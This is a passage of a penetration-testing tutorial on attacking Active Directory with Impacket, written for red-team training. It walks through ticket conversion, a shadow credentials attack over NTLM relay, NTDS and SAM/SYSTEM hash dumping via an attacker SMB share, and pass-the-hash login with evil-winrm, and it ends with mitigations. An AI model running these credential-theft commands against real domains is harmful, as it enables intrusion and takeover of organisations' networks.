+<p><span style="color: #000000;">This script will convert kirbi files (commonly used by mimikatz) into ccache files used by impacket, and vice versa</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ticketConverter Administrator.ccache admin.kirbi</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgg1vZjhCRNsZOq3lx6dLJhor6icZ2Bi8wbGlDNIPCsULYNhK33gWzpR3QznFr67z057YUpamzgzMeu9ldlfxd9_pPH9CcOW-kdu5FhloQ-ykRpGwSCiZ_DYw_tGPMkbbYxfSAhd11Pot9YR6v9k1CF6eMeNK7uO_fZNw1QSz9IJ31XZsC4loCyaB9vsBRT/s16000/72.png"/></span></p>
+<h3><span style="color: #800000;">Shadow Credentials Attack</span></h3>
+<p><span style="color: #000000;">The <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/shadow-credentials-attack/">Shadow Credentials</a></span> attack takes advantage of improper permissions on the msDS-KeyCredentialLink attribute, allowing attackers to inject their own public key into the attribute of a target user or computer account. Once this is done, they can impersonate the target account using PKINIT.</span></p>
+<p><span style="color: #000000;">Here is how the attack works step by step:</span></p>
+<ul>
+<li><span style="color: #000000;">Identify Target Permissions</span></li>
+<li><span style="color: #000000;">Inject the Attacker’s Public Key</span></li>
+<li><span style="color: #000000;">Generate a Certificate</span></li>
+<li><span style="color: #000000;">Authenticate as the Target Account</span></li>
+<li><span style="color: #000000;">Impersonate Users or Escalate Privileges</span></li>
+</ul>
+<p><span style="color: #000000;">You can set shadow credentials on the computer object using impacket’s ntlmrelayx.</span></p>
+<p><span style="color: #000000;">We will launch ntlmrelayx with the “–shadow-credentials” option and the “–shadow-target” parameter set to the name of the computer account that we are expecting to relay (in this case, DC$)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-ntlmrelayx -t ldap://192.168.1.14 --shadow-credentials --shadow-target 'dc$'</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQmZuNuwZMZtgQB1Uw1DwFrWtcZv00s09YZKbqFuHX8YSKmXRrGpnqxc_t7v-4H9MgYDheUXjQOEvbghRIIVQVuPeZ6K360V8atPGGhcZSC64MTc-ZfVUL54cXbbAM3sb9bRh3KTRgg-bA-WLeJehetx2VyfsVdEEOEga32F0Ah8Xm7_xphScK9SpiDZWB/s16000/80.png" alt="Impacket Active Directory Attacks" width="1215" height="567"/></span></p>
+<p><span style="color: #000000;">Trigger a callback via browser, using krishna user’s credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2sdW3q6fXqXt0FNsIaOjJePrVGEKDB8Us6cgeZKeNe9J-Z7D7qEi6SEkx22hl56vD3tHZWO2mmUm3lUb2NruYSZZiPsJas5czUdDO6jgll4Zcuo4o_aQOQUUSsjAFadFdqylnC-0-rVviBUq9x2_hjhAquxt07KlOoo9q8kVWZfOSP1VjXqfQTXjOv47N/s16000/81.png"/></span></p>
+<p><span style="color: #000000;">After a brief wait, we receive an HTTP connection from the DC$ computer account along with its NTLM credentials. These credentials are then relayed to the LDAP service on the domain controller and the <strong>msDS-KeyCredentialLink</strong> attribute of the relayed computer account is updated.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5z2tM7L6Es1wNp6tPxOsWNwpm0MbKC9737E-DxVYelMPXgc8uAcg7wcJ4atWBqt3EamuUTtgKayfcNAtG0I4qoezNvvg4IFHXZG95p9EnSogh8K5qGLVk6j0ZseScUGe3VDiijyUwjbw_tDY2DiIvZa8a6cpuabpiKFgM8Jr9h5l0tX9lyw4ietP9-PI7/s16000/82.png" alt="Impacket Active Directory Attacks" width="1278" height="426"/></span></p>
+<p><span style="color: #000000;">Use Certificate to Dump NTDS</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.14 --pfx-cert FZn7B2sQ.pfx --pfx-pass 05FY014jsNhqqL1IbDhr -u DC$ --ntds --user administrator</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxrHD4mN1aDMeRFJYmUqigJMdpZOYQrUF5-QXjcGZTCQC2dZeSvQ7GEY1MLYPbiPBePB0dCZmBXgReCT2tQxbL3ju0FmLotlQU7SQfRENA8gyd_By7NdOW_zYU8VcUZ9Te2lsrGc1E7nNXRAXW7pYpkP0ALFfphQ7nnt0MN5iV_RcblY5zdG2mZ4RvJih1/s16000/83.png"/></span></p>
+<h3><span style="color: #800000;">Extracting Credentials from Registry Hive</span></h3>
+<p><span style="color: #000000;">Impacket-reg is a tool from the Impacket suite used to remotely interact with the Windows Registry of a target machine over SMB using credentials — typically useful during post-exploitation, red teaming, or lateral movement.</span></p>
+<p><span style="color: #000000;"><strong>Key Privileges That Help:</strong></span></p>
+<p><span style="color: #000000;"><em>SeBackupPrivilege:</em> Allows reading SYSTEM/SAM/NTDS files even if you don’t have full admin</span><br/>
+<span style="color: #000000;"><em>Administrator:</em> (Local or Domain) Can dump registry, access files, and use tools like secretsdump, reg.py</span><br/>
+<span style="color: #000000;"><em>RemoteRegistry Service</em>: Running Required for reg.py to connect and dump</span><br/>
+<span style="color: #000000;"><em>SeDebugPrivilege:</em> (Advanced) Helps inject into LSASS (used by Mimikatz), useful in custom attacks</span></p>
+<p><span style="color: #000000;">First, set up an SMB share on your attacker machine using the impacket-smbserver. This share will store the dumped registry files.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd) -smb2support</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhanF36PByHz8hVS0Cj9ostgNUOqU9Wmd8O84lA8Tribm-WYfrlQATK-gcyB4C2IzfWr5S8aG7meduXD2tCXN1D0zQEBRNFLOFWCz6Z5A1XRRNayK4UYv7TB3wtdhDxf5_dr3EPJvUc9VsvUbNHTTXEZ0flD8GFQ5UV8I0ojiS2miY2wXSA3gyp9sETIs7y/s16000/84.png" alt="Impacket Active Directory Attacks" width="950" height="422"/></span></p>
+<p><span style="color: #000000;">Next, dump the SAM and SYSTEM hives from the target machine, using the impacket-reg tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-reg ignite.local/aarav:Password@1@192.168.1.48 backup -o '\\192.168.1.16\share'</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgeUvjEoB_ThISRZA7HKXIuSf3pyktHpbugiC0yuE7gLWXcAE9kCYa1MhFmRn9cv25n0g00WY54DzQ8JTrUgNNVRzs5nxM1FvHj9hPxpajhajLOrBH3ZliXqNchLUdlWx1UFML_SQSjCZzywjcs392E8tO6E2VVXCHPL2xJDLBE2QW7ULTBZHCAVLYk_Gdz/s16000/85.png" alt="Impacket Active Directory Attacks" width="1194" height="255"/></span></p>
+<p><span style="color: #000000;">Finally, on the Kali Linux shell, use Impacket’s secretsdump to extract password hashes from the SAM and SYSTEM hive</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save local</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZS6LXe2fb8uw9SotbwJNo7PtMpzSbUSg3Z8JqfHh3r1vE4FSYZrnJ02HmRQ0IjG2qAzpaxNfF0Ly9Ks95p3Imie0FVd4QYF1JCgRMG0GPAySAcJrP1aTBfOGxPewWN3hqthXhT83UV4rrl3EoOBahkGgPuQvAqEakgR4AdRnlTSueDd8pup9Rl7_3m3z9/s16000/86.png"/></span></p>
+<p><span style="color: #000000;">As illustrated below, we successfully extracted the Administrator account hashes. Use Evil-WinRM to log in as Administrator using the extracted hash, thereby achieving privilege escalation on the Windows Domain Controller.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.48 -u administrator -H 32196b56ffe6f45e294117b91a83bf38</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0HrC6oKntHsVVM5Noye00EY1BDHyB927bTuJ1Mqk0QYQCg4pq6hTrIjh2eQNPrbYXe5jreegCXv0PYlx_b66iAl168FfQEOHG789BLdJIjn1JPvU38EsG_0MxwR_-x31n1Qtag788mvU0FoeaaswM8vA9ST5gCBQYfh8fPzJSl_6kOXLqU-YVi9gXrfp_/s16000/87.png" alt="Impacket Active Directory Attacks" width="1142" height="279"/></span></p>
+<h3><span style="color: #800000;">Mitigations</span></h3>
+<ul>
+<li><span style="color: #000000;">Disable insecure Kerberos settings (e.g., pre-authentication).</span></li>
+<li><span style="color: #000000;">Restrict delegation rights (Constrained Delegation &gt; RBCD).</span></li>
+<li><span style="color: #000000;">Monitor for anomalous ticket requests (e.g., GetUserSPNs, DCSync).</span></li>
+<li><span style="color: #000000;">Implement LAPS securely and restrict access.</span></li>
+<li><span style="color: #000000;">Enable SMB signing to prevent relay attacks.</span></li>
+</ul>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">Impacket is an indispensable tool for AD penetration testing, enabling attackers (and defenders) to exploit common misconfigurations. This guide covered:</span></p>
+<ul>
+<li><span style="color: #000000;">Enumeration (users, computers)</span></li>
+<li><span style="color: #000000;">Kerberos attacks (AS-REP, Kerberoasting)</span></li>
+<li><span style="color: #000000;">Delegation abuse (RBCD)</span></li>
+<li><span style="color: #000000;">Credential dumping (DCSync, LAPS, PtH)</span></li>
+<li><span style="color: #000000;">Shadow credentials &amp; persistence</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contac</span>t <a href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
